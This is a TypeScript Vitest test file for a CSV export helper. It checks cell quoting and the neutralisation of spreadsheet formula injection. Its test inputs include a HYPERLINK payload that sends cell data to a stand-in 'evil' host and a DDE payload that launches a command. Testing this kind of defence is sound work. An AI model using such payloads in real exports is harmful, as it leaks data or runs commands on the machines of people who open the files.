import { describe, it, expect } from "vitest";
import { csvCell, csvRow } from "@/lib/csv";

/** The Form Inbox export's cell escaping before lib/csv.ts existed. */
const legacyCell = (v: unknown) => `"${String(v).replace(/"/g, '""')}"`;

describe("csvCell — ordinary values are unchanged from the previous implementation", () => {
  const ordinary: unknown[] = [
    "Jane Doe",
    "jane@example.com",
    "contact-us",
    "received",
    "2026-11-27T08:15:30.000Z",
    "",
    "He said \"hi\"",
    "Smith, John",
    "line one\nline two",
    "a=b",
    "1+1",
    "mid-word",
    "user@host",
    "tab\tinside",
    "082 123 4567",
    "{\"a\":1}",
    "  padded text  ",
    42,
    0,
    3.14,
    true,
    false,
  ];
  it.each(ordinary)("%j", (value) => {
    expect(csvCell(value)).toBe(legacyCell(value));
  });
});

describe("csvCell — quoting", () => {
  it("wraps in double quotes", () => {
    expect(csvCell("abc")).toBe('"abc"');
  });
  it("doubles embedded quotes", () => {
    expect(csvCell('a"b"c')).toBe('"a""b""c"');
  });
  it("keeps commas and newlines inside the quoted cell", () => {
    expect(csvCell("a,b\nc\r\nd")).toBe('"a,b\nc\r\nd"');
  });
});

describe("csvCell — formula neutralisation", () => {
  it.each([
    ["=", "=1+1"],
    ["+", "+1+1"],
    ["-", "-1+1"],
    ["@", "@SUM(A1:A2)"],
    ["TAB", "\t=1+1"],
    ["CR", "\r=1+1"],
  ])("prefixes a single quote when the first character is %s", (_name, value) => {
    expect(csvCell(value)).toBe(`"'${value}"`);
  });

  it("neutralises the HYPERLINK exfiltration payload and still doubles its quotes", () => {
    expect(csvCell('=HYPERLINK("http://evil/?"&B2,"click")')).toBe(
      '"\'=HYPERLINK(""http://evil/?""&B2,""click"")"',
    );
  });

  it("neutralises a DDE payload", () => {
    expect(csvCell("=cmd|' /C calc'!A0")).toBe("\"'=cmd|' /C calc'!A0\"");
  });

  it("prefixes exactly one quote, including when the value already starts with one trigger after another", () => {
    expect(csvCell("==1")).toBe("\"'==1\"");
    expect(csvCell("+-1")).toBe("\"'+-1\"");
  });

  it.each([" =1+1", "   +1", " \t-1", "\n=1+1", " @x"])(
    "treats a trigger after leading whitespace as dangerous: %j",
    (value) => {
      expect(csvCell(value)).toBe(`"'${value}"`);
    },
  );

  it("does not prefix whitespace-only or whitespace-then-text values", () => {
    expect(csvCell("   ")).toBe('"   "');
    expect(csvCell("  hello")).toBe('"  hello"');
    expect(csvCell("\nhello")).toBe('"\nhello"');
  });

  it("accepted trade-off: negative numbers and international phone numbers are prefixed", () => {
    expect(csvCell("-5")).toBe("\"'-5\"");
    expect(csvCell("+27 82 123 4567")).toBe("\"'+27 82 123 4567\"");
    expect(csvCell(-5)).toBe("\"'-5\"");
  });

  it("an already-quoted-looking value is not treated as a formula", () => {
    expect(csvCell("'=1+1")).toBe("\"'=1+1\"");
  });
});

describe("csvCell — non-string input", () => {
  it("null and undefined become an empty cell", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
  it("numbers and booleans are stringified", () => {
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell(0)).toBe('"0"');
    expect(csvCell(1.5)).toBe('"1.5"');
    expect(csvCell(true)).toBe('"true"');
  });
  it("NaN and Infinity are stringified, -Infinity is neutralised", () => {
    expect(csvCell(NaN)).toBe('"NaN"');
    expect(csvCell(Infinity)).toBe('"Infinity"');
    expect(csvCell(-Infinity)).toBe("\"'-Infinity\"");
  });
});

describe("csvRow", () => {
  it("joins escaped cells with commas", () => {
    expect(csvRow(["Jane", "a,b", null, 7, "=1+1"])).toBe('"Jane","a,b","","7","\'=1+1"');
  });
  it("escapes a header row, neutralising a formula-like column key", () => {
    expect(csvRow(["Name", "Email", "=HYPERLINK(\"http://evil\",\"x\")", "Notes, extra", "@cmd"])).toBe(
      '"Name","Email","\'=HYPERLINK(""http://evil"",""x"")","Notes, extra","\'@cmd"',
    );
  });
  it("an empty row is an empty string", () => {
    expect(csvRow([])).toBe("");
  });
  it("matches the previous implementation for an ordinary row", () => {
    const row = ["Jane Doe", "jane@example.com", "contact", "received", "2026-11-27T08:15:30.000Z", "Hi, \"there\""];
    expect(csvRow(row)).toBe(row.map(legacyCell).join(","));
  });
});
